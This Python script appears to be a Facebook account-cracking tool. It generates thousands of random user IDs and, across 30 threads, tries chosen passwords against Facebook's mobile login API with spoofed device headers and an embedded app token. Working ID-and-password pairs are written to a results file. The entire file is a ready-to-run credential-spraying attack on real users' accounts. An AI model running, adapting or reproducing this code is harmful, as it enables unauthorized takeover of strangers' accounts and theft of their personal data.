import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from concurrent.futures import ThreadPoolExecutor 
from datetime import datetime
from bs4 import BeautifulSoup
def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E',                                                                                                                '4').replace(
    'M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'





logo=(f"""
\033[97;1m   ###  #  # #  #  
\033[96;1m     # # # # # # # 
\033[93;1m    #  # #  #  ### 
\033[94;1m   #   # #  #  # # 
\033[97;1m   ###  #   #  # #  
                                                               
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mNAVEED AHMED BADSHA KHAN XD AUR TOM KA PAPA
\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m ZOYA X AHMED
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mNOT_AVAILABLE
\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36mPRIVATE
\033[1;37m══════════════════════════════════════════\n""")





class Random:
    def __init__(self):
        self.id = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\t    \033[0;92m 2006-14 UID CLONING \033[0;97m ")
        print('\033[1;37m(•)══════════════════════════════════════════')
        print(" \033[1;97m[1] \033[1;93mCRACK RANDOM FB ID 2004-09 ")
        print(" \033[1;97m[B] \033[1;92mBack in menu")
        print('\033[1;37m(•)══════════════════════════════════════════')
        annu = input("\033[0;97m[+] \033[0;92mCHOOSE \033[0;91m: \033[0;96m")
        if annu in ["", " "]:
            Random()
        elif annu in ["1", "01"]:
            os.system("clear");print(logo);self.fbtua()
        elif annu in ["B", "b"]:
        	Main() 
    def fbtua(self):
        x = 111111111
        xx = 999999999
        idx = "100000"
        
        limit = int(input("\033[0;97m[+]\033[0;92m TOTAL IDS TO CRACK (LIMIT 50000) \033[0;91m: \033[0;97m"))
        try:
            for n in range(limit):
                _ = random.randint(x, xx)
                __ = idx
                self.id.append(__ + str(_))
            print("\033[0;97m[√] \033[0;92mTOTAL IDS \033[0;91m: \033[0;97m%s\033[0;96m" % (len(self.id)))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print("%s\033[0;92m[+] \033[0;97mENTER PASSWORD EXAMPLE \033[0;91m: \033[0;92m%s(123456)" % (Y, G))
                print('\033[1;37m(•)══════════════════════════════════════════')
                listpass = input("%s\033[0;92m[?] \033[0;97mENTER PASSWORD \033[0;91m: \033[0;92m%s " % (Y, G))
                if len(listpass) <= 5:
                    exit("%s\033[0;92m[!] \033[0;92mPASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s\033[0;92m[*] \033[0;97mCRACK WITH PASSWORD \033[0;91m-> \033[0;93m[\033[0;92m%s\033[0;93m]" % (Y, listpass))
                os.system("clear");print(logo)
                
                print("\033[1;32m(√) Total IDs :\033[1;32m%s\033[0;92m" % (len(self.id)))
                print("%s\033[1;35m(√) Entered Password : \033[1;32m%s" % (Y, listpass))
                print("\x1b[38;5;208m(!) Use Flight Mode For Speed UP")
                print('\033[1;37m(•)══════════════════════════════════════════')
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> Zoya-OK.txt" % (G))
            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> Zoya-CP.txt" % (Y))
            print('\n\033[1;37m(•)══════════════════════════════════════════')
            input("\n\033[0;92m[√]\033[0;97m CRACK COMPLETE...\n\033[0;92m[~] \033[0;97mPRESS ENTER TO BACK MAIN MENU");Main()
        except Exception as e:
            exit(str(e))
    def api(self, uid, pwx):
        ua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
])
        sys.stdout.write("\r\r %s\033[0;97m[\033[0;92m Z•O•Y•A \033[0;97m]\033[0;97m  %s\033[0;97m/\033[0;92m%s \033[0;97m[\033[0;92mOK\033[0;91m:\033[0;92m%s\033[0;97m]" % (B, self.loop, len(self.id), len(self.cp)));sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": ua,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"}
            response = ses.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers)
            if "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[USMAN-OK] %s √ %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s√%s" % (uid, pw))
                open("Zoya-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
                break
            else:
                continue
        self.loop += 1
Random()  

